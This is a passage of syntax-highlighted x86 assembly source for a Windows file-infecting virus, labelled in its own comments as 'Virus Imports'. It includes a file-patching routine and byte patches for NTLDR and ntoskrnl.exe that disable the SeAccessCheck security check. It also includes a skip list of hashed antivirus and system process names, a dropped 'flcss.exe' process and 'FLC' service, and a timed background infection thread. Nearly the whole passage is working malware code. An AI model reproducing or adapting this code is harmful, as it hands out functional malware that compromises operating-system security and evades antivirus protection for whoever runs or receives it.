             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">p_FileSize</span><span class="sc0">

</span><span class="sc5">PA_00</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">ecx</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">esi</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">edi</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">p_PatchSize</span><span class="sc0">
             </span><span class="sc6">repz</span><span class="sc0">         </span><span class="sc6">cmpsb</span><span class="sc0">
             </span><span class="sc6">pop</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc0">
             </span><span class="sc6">pop</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc0">
             </span><span class="sc6">pop</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">PA_01</span><span class="sc0">
             </span><span class="sc6">inc</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc0">
             </span><span class="sc6">loop</span><span class="sc0">         </span><span class="sc5">PA_00</span><span class="sc0">

             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">PA_Unmap</span><span class="sc0">

</span><span class="sc5">PA_01</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">p_PatchSize</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
             </span><span class="sc6">repz</span><span class="sc0">         </span><span class="sc6">movsb</span><span class="sc0">

</span><span class="sc5">PA_Unmap</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">edx</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">UnmapViewOfFile</span><span class="sc0">

</span><span class="sc5">PA_CloseMap</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc5">p_MapHandle</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">CloseHandle</span><span class="sc0">

</span><span class="sc5">PA_CloseFile</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc5">p_FileHandle</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">CloseHandle</span><span class="sc0">

</span><span class="sc5">PA_Exit</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">PatchFile</span><span class="sc0">                 </span><span class="sc9">ENDP</span><span class="sc0">


</span><span class="sc1">; ------------------------------------------------------------------------- ;</span><span class="sc0">
</span><span class="sc1">; ---------------------------   Minor Routines   -------------------------- ;</span><span class="sc0">
</span><span class="sc1">; ------------------------------------------------------------------------- ;</span><span class="sc0">


</span><span class="sc5">GetVS</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
             </span><span class="sc6">pop</span><span class="sc0">          </span><span class="sc8">ebx</span><span class="sc0">
             </span><span class="sc6">sub</span><span class="sc0">          </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GetVS</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VStart</span><span class="sc0">
             </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">; ------------------------------------------------------------------------- ;</span><span class="sc0">
</span><span class="sc1">; ------------------------------------------------------------------------- ;</span><span class="sc0">


</span><span class="sc5">RelocKernel32</span><span class="sc0">             </span><span class="sc9">PROC</span><span class="sc0">         </span><span class="sc10">PASCAL</span><span class="sc0">       </span><span class="sc10">NEAR</span><span class="sc0">


</span><span class="sc5">ARG</span><span class="sc0">          </span><span class="sc5">r_Kernel32</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0">


             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc5">r_Kernel32</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">Whereis_GPA</span><span class="sc0">

             </span><span class="sc6">or</span><span class="sc0">           </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">RK_00</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">lea</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">Kernel32_Functions</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">esi</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">DLL_Relocate</span><span class="sc0">
</span><span class="sc5">RK_00</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">RelocKernel32</span><span class="sc0">             </span><span class="sc9">ENDP</span><span class="sc0">


</span><span class="sc1">; ------------------------------------------------------------------------- ;</span><span class="sc0">
</span><span class="sc1">; ------------------------------------------------------------------------- ;</span><span class="sc0">


</span><span class="sc5">RelocAdvapi32</span><span class="sc0">             </span><span class="sc9">PROC</span><span class="sc0">         </span><span class="sc10">NEAR</span><span class="sc0">


             </span><span class="sc6">lea</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ADVAPI32_Name</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">LoadLibraryA</span><span class="sc0">
             </span><span class="sc6">or</span><span class="sc0">           </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">RA_00</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">lea</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">ADVAPI32_Functions</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">esi</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">DLL_Relocate</span><span class="sc0">

</span><span class="sc5">RA_00</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">RelocAdvapi32</span><span class="sc0">             </span><span class="sc9">ENDP</span><span class="sc0">


</span><span class="sc1">; ------------------------------------------------------------------------- ;</span><span class="sc0">
</span><span class="sc1">; ------------------------------------------------------------------------- ;</span><span class="sc0">


</span><span class="sc5">OpenFile</span><span class="sc0">                  </span><span class="sc9">PROC</span><span class="sc0">         </span><span class="sc10">PASCAL</span><span class="sc0">       </span><span class="sc10">NEAR</span><span class="sc0">


</span><span class="sc5">ARG</span><span class="sc0">          </span><span class="sc5">o_Filename</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> \
             </span><span class="sc5">o_OpenMode</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">20</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc5">o_Filename</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">SetFileAttributesA</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">00</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">80</span><span class="sc0">                        </span><span class="sc1">; normal attributes</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc5">o_OpenMode</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">00</span><span class="sc0">                       
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">00</span><span class="sc0">                        </span><span class="sc1">; not shared</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">0C0000000</span><span class="sc0">                 </span><span class="sc1">; r/w</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc5">o_Filename</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">CreateFileA</span><span class="sc0">
             </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">OpenFile</span><span class="sc0">                  </span><span class="sc9">ENDP</span><span class="sc0">
             

</span><span class="sc1">; ------------------------------------------------------------------------- ;</span><span class="sc0">
</span><span class="sc1">; ------------------------------------------------------------------------- ;</span><span class="sc0">


</span><span class="sc5">MapFile</span><span class="sc0">                   </span><span class="sc9">PROC</span><span class="sc0">         </span><span class="sc10">PASCAL</span><span class="sc0">       </span><span class="sc10">NEAR</span><span class="sc0">


</span><span class="sc5">ARG</span><span class="sc0">          </span><span class="sc5">m_FileHandle</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> \
             </span><span class="sc5">m_FileSize</span><span class="sc0">   </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0">


             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">00</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc5">m_FileSize</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">00</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">04</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">00</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc5">m_FileHandle</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">CreateFileMappingA</span><span class="sc0">
             </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">MapFile</span><span class="sc0">                   </span><span class="sc9">ENDP</span><span class="sc0">


</span><span class="sc1">; ------------------------------------------------------------------------- ;</span><span class="sc0">
</span><span class="sc1">; ------------------------------------------------------------------------- ;</span><span class="sc0">


</span><span class="sc5">ViewMap</span><span class="sc0">                   </span><span class="sc9">PROC</span><span class="sc0">         </span><span class="sc10">PASCAL</span><span class="sc0">       </span><span class="sc10">NEAR</span><span class="sc0">


</span><span class="sc5">ARG</span><span class="sc0">          </span><span class="sc5">v_MapHandle</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0">


             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">00</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">00</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">00</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">02</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc5">v_MapHandle</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">MapViewOfFile</span><span class="sc0">
             </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">ViewMap</span><span class="sc0">                   </span><span class="sc9">ENDP</span><span class="sc0">


</span><span class="sc1">; ------------------------------------------------------------------------- ;</span><span class="sc0">
</span><span class="sc1">; ------------------------------------------------------------------------- ;</span><span class="sc0">
             

</span><span class="sc5">Wait_A_Little</span><span class="sc0">             </span><span class="sc9">PROC</span><span class="sc0">         </span><span class="sc10">NEAR</span><span class="sc0">


             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">GetTickCount</span><span class="sc0">
             </span><span class="sc6">sub</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">Tick</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; allow thread to</span><span class="sc0">
                                                    </span><span class="sc1">; run for 4 seconds</span><span class="sc0">
             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">1000d</span><span class="sc0">               
             </span><span class="sc6">jc</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">WAL_00</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">16d</span><span class="sc4">*</span><span class="sc2">1000d</span><span class="sc0">                 </span><span class="sc1">; then wait 16 seconds</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">Sleep</span><span class="sc0">

             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">GetTickCount</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc5">Tick</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">WAL_00</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">Wait_A_Little</span><span class="sc0">             </span><span class="sc9">ENDP</span><span class="sc0">


</span><span class="sc1">; ------------------------------------------------------------------------- ;</span><span class="sc0">
</span><span class="sc1">; ------------------------------------------------------------------------- ;</span><span class="sc0">


</span><span class="sc5">GetRand</span><span class="sc0">                   </span><span class="sc9">PROC</span><span class="sc0">         </span><span class="sc10">NEAR</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">ecx</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">edx</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">Rand</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">xor</span><span class="sc0">          </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">7FFFFFFF</span><span class="sc0">
             </span><span class="sc6">mul</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc0">
             </span><span class="sc6">inc</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0FFFFFFFBh</span><span class="sc0">
             </span><span class="sc6">div</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc5">Rand</span><span class="sc0"> </span><span class="sc5">@</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">pop</span><span class="sc0">          </span><span class="sc8">edx</span><span class="sc0">
             </span><span class="sc6">pop</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc0">
             </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">GetRand</span><span class="sc0">                   </span><span class="sc9">ENDP</span><span class="sc0">


</span><span class="sc1">; ------------------------------------------------------------------------- ;</span><span class="sc0">
</span><span class="sc1">; --------------------------   INITIALIZED DATA   ------------------------- ;</span><span class="sc0">
</span><span class="sc1">; ------------------------------------------------------------------------- ;</span><span class="sc0">


</span><span class="sc5">HostCode</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">


</span><span class="sc5">GPA_Sigs</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">W9x</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0C2</span><span class="sc4">,</span><span class="sc2">04</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc4">,</span><span class="sc2">57</span><span class="sc4">,</span><span class="sc2">6A</span><span class="sc4">,</span><span class="sc2">22</span><span class="sc4">,</span><span class="sc2">2Bh</span><span class="sc4">,</span><span class="sc2">0D2</span><span class="sc0">
</span><span class="sc5">NT4</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0C2</span><span class="sc4">,</span><span class="sc2">04</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc4">,</span><span class="sc2">55</span><span class="sc4">,</span><span class="sc2">8Bh</span><span class="sc4">,</span><span class="sc2">4C</span><span class="sc4">,</span><span class="sc2">24</span><span class="sc4">,</span><span class="sc2">0C</span><span class="sc0">
</span><span class="sc5">W2K</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">00F</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc4">,</span><span class="sc2">55</span><span class="sc4">,</span><span class="sc2">8Bh</span><span class="sc4">,</span><span class="sc2">0ECh</span><span class="sc4">,</span><span class="sc2">51</span><span class="sc4">,</span><span class="sc2">51</span><span class="sc0">


</span><span class="sc5">NTLDR</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc12">'NTLDR'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">NT4_NTLDR</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">3Bh</span><span class="sc4">,</span><span class="sc2">46</span><span class="sc4">,</span><span class="sc2">58</span><span class="sc4">,</span><span class="sc2">74</span><span class="sc4">,</span><span class="sc2">07</span><span class="sc0">           </span><span class="sc1">; signature (file check)</span><span class="sc0">
             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">3Bh</span><span class="sc4">,</span><span class="sc2">46</span><span class="sc4">,</span><span class="sc2">58</span><span class="sc4">,</span><span class="sc2">0EBh</span><span class="sc4">,</span><span class="sc2">07</span><span class="sc0">         </span><span class="sc1">; patch</span><span class="sc0">

</span><span class="sc5">W2K_NTLDR</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">3Bh</span><span class="sc4">,</span><span class="sc2">47</span><span class="sc4">,</span><span class="sc2">58</span><span class="sc4">,</span><span class="sc2">74</span><span class="sc4">,</span><span class="sc2">07</span><span class="sc0">
             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">3Bh</span><span class="sc4">,</span><span class="sc2">47</span><span class="sc4">,</span><span class="sc2">58</span><span class="sc4">,</span><span class="sc2">0EBh</span><span class="sc4">,</span><span class="sc2">07</span><span class="sc0">


</span><span class="sc5">NTOSKRNL</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc12">'WINNT\System32\ntoskrnl.exe'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">NT4_NTOSKRNL</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">8A</span><span class="sc4">,</span><span class="sc2">0C3</span><span class="sc4">,</span><span class="sc2">5F</span><span class="sc4">,</span><span class="sc2">5E</span><span class="sc4">,</span><span class="sc2">5Bh</span><span class="sc4">,</span><span class="sc2">5Dh</span><span class="sc4">,</span><span class="sc2">0C2</span><span class="sc4">,</span><span class="sc2">28</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">  </span><span class="sc1">; SeAccessCheck</span><span class="sc0">
             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B0</span><span class="sc4">,</span><span class="sc2">01</span><span class="sc4">,</span><span class="sc2">5F</span><span class="sc4">,</span><span class="sc2">5E</span><span class="sc4">,</span><span class="sc2">5Bh</span><span class="sc4">,</span><span class="sc2">5Dh</span><span class="sc4">,</span><span class="sc2">0C2</span><span class="sc4">,</span><span class="sc2">28</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">

</span><span class="sc5">W2K_NTOSKRNL</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">8A</span><span class="sc4">,</span><span class="sc2">45</span><span class="sc4">,</span><span class="sc2">14</span><span class="sc4">,</span><span class="sc2">5F</span><span class="sc4">,</span><span class="sc2">5E</span><span class="sc4">,</span><span class="sc2">5Bh</span><span class="sc4">,</span><span class="sc2">5Dh</span><span class="sc4">,</span><span class="sc2">0C2</span><span class="sc4">,</span><span class="sc2">28</span><span class="sc0">
             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B0</span><span class="sc4">,</span><span class="sc2">01</span><span class="sc4">,</span><span class="sc2">90</span><span class="sc4">,</span><span class="sc2">5F</span><span class="sc4">,</span><span class="sc2">5E</span><span class="sc4">,</span><span class="sc2">5Bh</span><span class="sc4">,</span><span class="sc2">5Dh</span><span class="sc4">,</span><span class="sc2">0C2</span><span class="sc4">,</span><span class="sc2">28</span><span class="sc0">

</span><span class="sc5">SkipNames</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc2">139D7300h</span><span class="sc0"> </span><span class="sc1">; aler</span><span class="sc0">
             </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc2">0F977200h</span><span class="sc0"> </span><span class="sc1">; amon</span><span class="sc0">
             </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc2">118E7E1Eh</span><span class="sc0"> </span><span class="sc1">; _avp</span><span class="sc0">
             </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc2">52886900h</span><span class="sc0"> </span><span class="sc1">; avp3</span><span class="sc0">
             </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc2">0C886900h</span><span class="sc0"> </span><span class="sc1">; avpm</span><span class="sc0">
             </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc2">13883207h</span><span class="sc0"> </span><span class="sc1">; f-pr</span><span class="sc0">
             </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc2">168E7E0Fh</span><span class="sc0"> </span><span class="sc1">; navw</span><span class="sc0">
             </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc2">0F997C12h</span><span class="sc0"> </span><span class="sc1">; scan</span><span class="sc0">
             </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc2">128B7212h</span><span class="sc0"> </span><span class="sc1">; smss</span><span class="sc0">
             </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc2">04907B05h</span><span class="sc0"> </span><span class="sc1">; ddhe</span><span class="sc0">
             </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc2">00946F05h</span><span class="sc0"> </span><span class="sc1">; dpla</span><span class="sc0">
             </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc2">00946F0Ch</span><span class="sc0"> </span><span class="sc1">; mpla</span><span class="sc0">


</span><span class="sc5">Process</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc12">'flcss.exe'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Service</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc12">'FLC'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">; Minimal Import Section</span><span class="sc0">

</span><span class="sc5">VImports</span><span class="sc4">:</span><span class="sc0">
                          </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Kernel32_Pointers</span><span class="sc0">     </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">I</span><span class="sc0">
                          </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
                          </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Kernel32_Name</span><span class="sc0">         </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">I</span><span class="sc0">
                          </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Kernel32_Relocated</span><span class="sc0">    </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">I</span><span class="sc0">
                          </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">14</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">Kernel32_Pointers</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Kernel32_Beep</span><span class="sc0">         </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">I</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Kernel32_Relocated</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Kernel32_Beep</span><span class="sc0">         </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">I</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Kernel32_Beep</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc12">'Beep'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">


</span><span class="sc1">; Virus Imports</span><span class="sc0">

</span><span class="sc5">Kernel32_Name</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc12">'KERNEL32.dll'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Kernel32_Functions</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">CloseHandle</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc2">0FF</span><span class="sc4">,</span><span class="sc2">0E0</span><span class="sc4">,</span><span class="sc12">'CloseHandle'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">CreateFileA</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc2">0FF</span><span class="sc4">,</span><span class="sc2">0E0</span><span class="sc4">,</span><span class="sc12">'CreateFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">CreateFileMappingA</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc2">0FF</span><span class="sc4">,</span><span class="sc2">0E0</span><span class="sc4">,</span><span class="sc12">'CreateFileMappingA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">CreateProcessA</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc2">0FF</span><span class="sc4">,</span><span class="sc2">0E0</span><span class="sc4">,</span><span class="sc12">'CreateProcessA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">CreateThread</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc2">0FF</span><span class="sc4">,</span><span class="sc2">0E0</span><span class="sc4">,</span><span class="sc12">'CreateThread'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
